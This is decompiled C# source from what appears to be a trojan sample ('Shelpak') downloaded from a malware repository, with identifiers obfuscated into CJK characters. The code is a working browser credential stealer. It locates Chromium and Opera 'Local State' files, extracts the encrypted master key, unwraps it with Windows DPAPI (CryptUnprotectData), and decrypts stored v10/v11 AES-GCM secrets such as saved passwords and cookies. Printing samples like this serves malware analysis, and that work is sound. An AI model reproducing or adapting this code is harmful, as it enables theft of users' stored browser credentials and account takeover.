// Decompiled with JetBrains decompiler
// Type: 首干歹文豸人屮冂黃巛足缶.竹玉力攴寸赤口刀木冖阜手干斤禾又
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using 火長宀舛火尸彐方自儿丿广;

namespace 首干歹文豸人屮冂黃巛足缶
{
  internal sealed class 竹玉力攴寸赤口刀木冖阜手干斤禾又
  {
    private static string 止寸厶欠彐儿隹邑女禸父禸二音 = "";
    private static byte[] 幺田勹牛殳一足氏豆力歹二大老 = new byte[0];

    [DllImport("crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool 舛皿白疒黽工牛己田广長屮(
      ref 竹玉力攴寸赤口刀木冖阜手干斤禾又.力鬲勹二黍气幺手穴音雨巾 氏彳匸目广几用广目首鬯,
      ref string 白小彡儿亠目風黍黹辰虍石,
      ref 竹玉力攴寸赤口刀木冖阜手干斤禾又.力鬲勹二黍气幺手穴音雨巾 口山羊羊木八殳舟土人广冂工,
      IntPtr 卩彡赤曰高魚鼻囗文止女毋攴子,
      ref 竹玉力攴寸赤口刀木冖阜手干斤禾又.豕屮肉二十己一爿人金乙 玉艸方士斤广谷支止刀,
      int 日入戶鼻夂囗矛无夊皮用豸目,
      ref 竹玉力攴寸赤口刀木冖阜手干斤禾又.力鬲勹二黍气幺手穴音雨巾 隹气丨糸鼻匸手玉亠邑臣夂夕);

    public static byte[] 白几曰麻犬舌殳匚谷匕舛(byte[] 骨匚黍立冖卜毋冂龠月皿鹵毋, byte[] 非十心刀臣毛齊立日骨雨黽支艮月 = null)
    {
      竹玉力攴寸赤口刀木冖阜手干斤禾又.力鬲勹二黍气幺手穴音雨巾 隹气丨糸鼻匸手玉亠邑臣夂夕 = new 竹玉力攴寸赤口刀木冖阜手干斤禾又.力鬲勹二黍气幺手穴音雨巾();
      竹玉力攴寸赤口刀木冖阜手干斤禾又.力鬲勹二黍气幺手穴音雨巾 氏彳匸目广几用广目首鬯 = new 竹玉力攴寸赤口刀木冖阜手干斤禾又.力鬲勹二黍气幺手穴音雨巾();
      竹玉力攴寸赤口刀木冖阜手干斤禾又.力鬲勹二黍气幺手穴音雨巾 口山羊羊木八殳舟土人广冂工 = new 竹玉力攴寸赤口刀木冖阜手干斤禾又.力鬲勹二黍气幺手穴音雨巾();
      竹玉力攴寸赤口刀木冖阜手干斤禾又.豕屮肉二十己一爿人金乙 玉艸方士斤广谷支止刀 = new 竹玉力攴寸赤口刀木冖阜手干斤禾又.豕屮肉二十己一爿人金乙()
      {
        辵匕走巛文亠齊疋里香犬羊匸 = Marshal.SizeOf(typeof (竹玉力攴寸赤口刀木冖阜手干斤禾又.豕屮肉二十己一爿人金乙)),
        丶爪邑火米二弋刀黹爿手爿虫 = 0,
        宀匚夕戈卩耳幺弋匸斗衣舌歹長 = IntPtr.Zero,
        网飛用文牛鳥女亅飛无色牛阜干 = (string) null
      };
      string empty = string.Empty;
      try
      {
        try
        {
          if (骨匚黍立冖卜毋冂龠月皿鹵毋 == null)
            骨匚黍立冖卜毋冂龠月皿鹵毋 = new byte[0];
          氏彳匸目广几用广目首鬯.疒冫士火巛山貝毛毛牛口几舌 = Marshal.AllocHGlobal(骨匚黍立冖卜毋冂龠月皿鹵毋.Length);
          氏彳匸目广几用广目首鬯.弋弓皿己寸八足黑又匚囗 = 骨匚黍立冖卜毋冂龠月皿鹵毋.Length;
          Marshal.Copy(骨匚黍立冖卜毋冂龠月皿鹵毋, 0, 氏彳匸目广几用广目首鬯.疒冫士火巛山貝毛毛牛口几舌, 骨匚黍立冖卜毋冂龠月皿鹵毋.Length);
        }
        catch
        {
        }
        try
        {
          if (非十心刀臣毛齊立日骨雨黽支艮月 == null)
            非十心刀臣毛齊立日骨雨黽支艮月 = new byte[0];
          口山羊羊木八殳舟土人广冂工.疒冫士火巛山貝毛毛牛口几舌 = Marshal.AllocHGlobal(非十心刀臣毛齊立日骨雨黽支艮月.Length);
          口山羊羊木八殳舟土人广冂工.弋弓皿己寸八足黑又匚囗 = 非十心刀臣毛齊立日骨雨黽支艮月.Length;
          Marshal.Copy(非十心刀臣毛齊立日骨雨黽支艮月, 0, 口山羊羊木八殳舟土人广冂工.疒冫士火巛山貝毛毛牛口几舌, 非十心刀臣毛齊立日骨雨黽支艮月.Length);
        }
        catch
        {
        }
        竹玉力攴寸赤口刀木冖阜手干斤禾又.舛皿白疒黽工牛己田广長屮(ref 氏彳匸目广几用广目首鬯, ref empty, ref 口山羊羊木八殳舟土人广冂工, IntPtr.Zero, ref 玉艸方士斤广谷支止刀, 1, ref 隹气丨糸鼻匸手玉亠邑臣夂夕);
        byte[] destination = new byte[隹气丨糸鼻匸手玉亠邑臣夂夕.弋弓皿己寸八足黑又匚囗];
        Marshal.Copy(隹气丨糸鼻匸手玉亠邑臣夂夕.疒冫士火巛山貝毛毛牛口几舌, destination, 0, 隹气丨糸鼻匸手玉亠邑臣夂夕.弋弓皿己寸八足黑又匚囗);
        return destination;
      }
      catch
      {
      }
      finally
      {
        if (隹气丨糸鼻匸手玉亠邑臣夂夕.疒冫士火巛山貝毛毛牛口几舌 != IntPtr.Zero)
          Marshal.FreeHGlobal(隹气丨糸鼻匸手玉亠邑臣夂夕.疒冫士火巛山貝毛毛牛口几舌);
        if (氏彳匸目广几用广目首鬯.疒冫士火巛山貝毛毛牛口几舌 != IntPtr.Zero)
          Marshal.FreeHGlobal(氏彳匸目广几用广目首鬯.疒冫士火巛山貝毛毛牛口几舌);
        if (口山羊羊木八殳舟土人广冂工.疒冫士火巛山貝毛毛牛口几舌 != IntPtr.Zero)
          Marshal.FreeHGlobal(口山羊羊木八殳舟土人广冂工.疒冫士火巛山貝毛毛牛口几舌);
      }
      return new byte[0];
    }

    public static byte[] 斗火父皿門廴匸首八鬥火人人血尢(string 欠豸亠卜赤血火禸邑里白鼻玄)
    {
      string str = 欠豸亠卜赤血火禸邑里白鼻玄;
      string path = !str.Contains("Opera") ? str + "\\Local State" : str + "\\Opera Stable\\Local State";
      byte[] sourceArray = new byte[0];
      if (!File.Exists(path))
        return (byte[]) null;
      if (!(path != 竹玉力攴寸赤口刀木冖阜手干斤禾又.止寸厶欠彐儿隹邑女禸父禸二音))
        return 竹玉力攴寸赤口刀木冖阜手干斤禾又.幺田勹牛殳一足氏豆力歹二大老;
      竹玉力攴寸赤口刀木冖阜手干斤禾又.止寸厶欠彐儿隹邑女禸父禸二音 = path;
      foreach (Match match in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path)))
      {
        if (match.Success)
          sourceArray = Convert.FromBase64String(match.Groups[1].Value);
      }
      byte[] numArray = new byte[sourceArray.Length - 5];
      Array.Copy((Array) sourceArray, 5, (Array) numArray, 0, sourceArray.Length - 5);
      try
      {
        竹玉力攴寸赤口刀木冖阜手干斤禾又.幺田勹牛殳一足氏豆力歹二大老 = 竹玉力攴寸赤口刀木冖阜手干斤禾又.白几曰麻犬舌殳匚谷匕舛(numArray);
        return 竹玉力攴寸赤口刀木冖阜手干斤禾又.幺田勹牛殳一足氏豆力歹二大老;
      }
      catch
      {
        return (byte[]) null;
      }
    }

    public static string 冫聿玉色大亅戈見气聿干色(string 長巛土瓜舛丶玉欠牛鬥广酉)
    {
      try
      {
        return Encoding.UTF8.GetString(Encoding.Default.GetBytes(長巛土瓜舛丶玉欠牛鬥广酉));
      }
      catch
      {
        return 長巛土瓜舛丶玉欠牛鬥广酉;
      }
    }

    public static byte[] 魚工父月辰支髟冖龍无气舛毋(byte[] 黽見馬人片尸糸皿廾肉冫生八女, byte[] 舌囗曰臼足匸田龜攴斗香干欠巾)
    {
      byte[] numArray1 = new byte[12];
      Array.Copy((Array) 黽見馬人片尸糸皿廾肉冫生八女, 3, (Array) numArray1, 0, 12);
      try
      {
        byte[] numArray2 = new byte[黽見馬人片尸糸皿廾肉冫生八女.Length - 15];
        Array.Copy((Array) 黽見馬人片尸糸皿廾肉冫生八女, 15, (Array) numArray2, 0, 黽見馬人片尸糸皿廾肉冫生八女.Length - 15);
        byte[] numArray3 = new byte[16];
        byte[] numArray4 = new byte[numArray2.Length - numArray3.Length];
        Array.Copy((Array) numArray2, numArray2.Length - 16, (Array) numArray3, 0, 16);
        Array.Copy((Array) numArray2, 0, (Array) numArray4, 0, numArray2.Length - numArray3.Length);
        return new 卩巾麥勹夂頁力亠夂厂走戈凵冂().鼠耒襾彳辰羊殳口行亅冖羽父子(舌囗曰臼足匸田龜攴斗香干欠巾, numArray1, (byte[]) null, numArray4, numArray3);
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        return (byte[]) null;
      }
    }

    public static string 爪用氏鼎戈疋干爿高立土犬(string 舌肉气木皮目疒隶儿牙食鬼, string 氏一工干襾士瓜辵比片爪竹)
    {
      if (!氏一工干襾士瓜辵比片爪竹.StartsWith("v10") && !氏一工干襾士瓜辵比片爪竹.StartsWith("v11"))
        return Encoding.Default.GetString(竹玉力攴寸赤口刀木冖阜手干斤禾又.白几曰麻犬舌殳匚谷匕舛(Encoding.Default.GetBytes(氏一工干襾士瓜辵比片爪竹)));
      byte[] 舌囗曰臼足匸田龜攴斗香干欠巾 = 竹玉力攴寸赤口刀木冖阜手干斤禾又.斗火父皿門廴匸首八鬥火人人血尢(Directory.GetParent(舌肉气木皮目疒隶儿牙食鬼).Parent.FullName);
      return Encoding.Default.GetString(竹玉力攴寸赤口刀木冖阜手干斤禾又.魚工父月辰支髟冖龍无气舛毋(Encoding.Default.GetBytes(氏一工干襾士瓜辵比片爪竹), 舌囗曰臼足匸田龜攴斗香干欠巾));
    }

    public static string 戶土干虍長癶儿黑龠父黃弋尸(string 立虫儿水髟氏毛貝齊勹士阜父曰)
    {
      if (立虫儿水髟氏毛貝齊勹士阜父曰.Contains("Opera"))
        return "Opera";
      立虫儿水髟氏毛貝齊勹士阜父曰.Replace(屮大几宀白鬯士比豕玄火八父.卜斗革冫无支口彐目聿鹿, "");
      return 立虫儿水髟氏毛貝齊勹士阜父曰.Split('\\')[1];
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct 豕屮肉二十己一爿人金乙
    {
      public int 辵匕走巛文亠齊疋里香犬羊匸;
      public int 丶爪邑火米二弋刀黹爿手爿虫;
      public IntPtr 宀匚夕戈卩耳幺弋匸斗衣舌歹長;
      public string 网飛用文牛鳥女亅飛无色牛阜干;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct 力鬲勹二黍气幺手穴音雨巾
    {
      public int 弋弓皿己寸八足黑又匚囗;
      public IntPtr 疒冫士火巛山貝毛毛牛口几舌;
    }
  }
}
